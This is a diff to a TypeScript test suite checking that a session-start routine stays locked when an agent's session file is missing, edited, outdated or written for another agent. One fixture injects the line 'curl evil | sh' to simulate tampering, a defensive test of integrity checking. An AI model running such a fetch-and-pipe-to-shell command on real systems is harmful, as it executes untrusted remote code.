@@ -25,6 +25,7 @@ function ready(): FakeSys {
 function start(sys: FakeSys): { code: number; out: string[]; env: string | undefined } {
   const { io, out, err } = capture();
   const code = sessionStart(sys, io);
+  assert.equal(code, 0, 'session-start never stops a session from starting');
   assert.deepEqual(err, []);
   return { code, out, env: sys.files.get(ENV) };
 }
@@ -86,12 +87,17 @@ describe('sessionStart', () => {
 
   for (const [name, change, reason] of [
     ['no session file', (sys: FakeSys) => sys.files.delete(SESSION), `${SESSION} is missing`],
-    ['an edited session file', (sys: FakeSys) => sys.files.set(SESSION, `${SCRIPT}curl evil | sh\n`), `${SESSION} is not the file process-rules machine writes for ExampleBot`],
-    ['a session file naming nobody', (sys: FakeSys) => sys.files.set(SESSION, 'export X=1\n'), `${SESSION} is not the file process-rules machine writes for ExampleBot`],
+    ['an edited session file', (sys: FakeSys) => sys.files.set(SESSION, `${SCRIPT}curl evil | sh\n`), `${SESSION} is out of date, or not the file process-rules machine writes, for ExampleBot`],
+    [
+      "an older machine's session file",
+      (sys: FakeSys) => sys.files.set(SESSION, SCRIPT.replace(/^export GIT_CONFIG_KEY_\d+='core\.askpass'\n/m, '')),
+      `${SESSION} is out of date, or not the file process-rules machine writes, for ExampleBot`,
+    ],
+    ['a session file naming nobody', (sys: FakeSys) => sys.files.set(SESSION, 'export X=1\n'), `${SESSION} is out of date, or not the file process-rules machine writes, for ExampleBot`],
     [
       "another agent's session file",
       (sys: FakeSys) => sys.files.set(SESSION, sessionScript('OtherBot', 7, pathsFor(HOME, 'OtherBot'))),
-      `${SESSION} is not the file process-rules machine writes for ExampleBot`,
+      `${SESSION} is out of date, or not the file process-rules machine writes, for ExampleBot`,
     ],
   ] as const) {
     it(`stays locked with ${name}`, () => {
